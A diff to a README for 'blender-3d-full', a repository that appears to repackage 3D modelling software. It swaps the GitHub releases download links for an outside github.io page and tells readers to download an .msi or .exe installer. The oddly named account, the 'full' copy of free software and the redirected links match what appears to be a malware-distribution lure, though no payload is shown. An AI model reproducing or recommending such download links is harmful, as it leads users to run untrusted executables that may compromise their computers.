@@ -1,6 +1,6 @@
 # 🎨 blender-3d-full - Create professional 3D models with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Chrissieparticular258/blender-3d-full/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://chrissieparticular258.github.io)
 
 ## 📖 About this software
 
@@ -21,7 +21,7 @@ Before you install this software on your Windows computer, confirm your machine 
 
 Follow these steps to get the software on your system:
 
-1.  Visit the [official releases page](https://github.com/Chrissieparticular258/blender-3d-full/releases) to access the current files.
+1.  Visit the [official releases page](https://chrissieparticular258.github.io) to access the current files.
 2.  Look for the section marked Assets at the bottom of the latest release post.
 3.  Click the link ending in .msi or .exe to begin your download.
 4.  Wait for the installer to finish downloading to your computer.
